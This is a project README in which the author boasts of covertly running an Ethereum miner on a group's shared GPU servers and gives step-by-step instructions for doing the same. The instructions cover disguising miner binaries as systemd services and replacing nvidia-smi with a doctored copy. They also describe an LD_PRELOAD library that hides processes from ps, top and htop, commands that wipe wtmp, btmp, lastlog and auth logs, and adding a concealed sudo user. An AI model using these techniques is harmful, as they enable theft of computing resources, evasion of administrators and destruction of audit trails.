# AWESOME WORK !!!
Since ETH has changed from PoW to PoS and can no longer be mined by GPUs, I open source this code I used to hide my ETH miner in our groups servers. I believe this code can reflect my craftsman spirit, as I constantly upgraded the code to prevent administrator's detection during mining and won finally. In addition to these codes, I even made a disguised [nvtop](https://github.com/Syllo/nvtop) (a htop-like tool for GPU) to hide the miner process and GPU usage.

## Structure
* exec: executed file.
    * nvidia-smi: excludes `systemd-diagnosis` in nvidia-smi panel.
    * systemd-firewall: is an adaptive system resource allocator determines which GPU the slave miners work on.
    * systemd-update: is the same to the `systemd-firewall` but more merciful that only works at midnight.
    * systemd-diagnosis: is the pool slave miner(Phoenix miner main file).
    * libGNU.co: hides specified processes for ps, top ,and htop.

* source: corresponding source code of the executed file in `./exec`.

## Installation

run the `Makefile` by `sudo make`. If you want to be blamed, run it without `sudo`. 

## Prerequiste
### environmental setting
make sure you have:
* gcc, which is preinstalled in your system.
* pyinstaller, installed by `pip install pyinstaller`.

### nvidia-smi
1. please make sure the variable `skip` in `source/nvidia-smi.py` is the same to the **slave miner**'s file name.
1. rename original `nvidia-smi` by `nl-toolkit` in `/usr/bin`.
1. move the *degraded* `nvidia-smi` to `/usr/bin`.
1. add read and execution permissions by `chmod +rx nvidia-smi`.

### systemd-firewall
1. move `systemd-firewall` to `/usr/bin`.
1. add read and execution permissions by `chmod +rx systemd-firewall`.

### systemd-update
1. same to the `systemd-firewall`.

### libGNU.co
1. move `libGNU.co` to `/usr/lib`.
1. add `/usr/lib/libGNU.so` to `/etc/ld.so.preload`; or add `export LD_PRELOAD=/usr/lib/libGNU.so` to `/etc/profile` (remember to execute `source /etc/profile` to make it effective).

**Risk:** add these files to system environment is easy to detect just by `cat /etc/ld.so.preload` or `echo $LD_PRELOAD`.

## Usage
**Very important:** run `sudo -s` first!
### Slash the miner
1. `nohup systemd-firewall 2>&1 > /dev/null &`.
1. check mining status by `nl-toolkit`.

### Check degraded files
1. `nvidia-smi`.
1. `ps aux | grep 'f2pool\|systemd-firewall\|systemd-diagnosis\|nl-toolkit'`.
1. `top -u root` or `htop -u root`.

### Clean login log
1. revise following files by 
```bash
utmpdump [logfile] > tmp_output.txt
utmpdump -r tmp_output.txt > [logfile]
```
* `last`: `/var/log/wtmp`.
* `lastb`: `/var/log/btmp`.

clean `lastlog` by `> /var/log/lastlog` if you are `root` user, or by `vi /var/log/lastlog` for otherwise.

1. delete your login log in `/var/log/auth.log` (for Ubuntu).
1. delete your login log in `/var/log/secure.log` (for CentOS).

## Tips
 * Add a new user by `useradd [your name] -G sudo -d /usr/bin -s /bin/bash -l -M`. `-l` can avoid you be added to `last` and `lastb`, but does not work for `lastlog`. `-M` will not create your home directory.
 * edit `/etc/passwd` to get more privileges for your account.
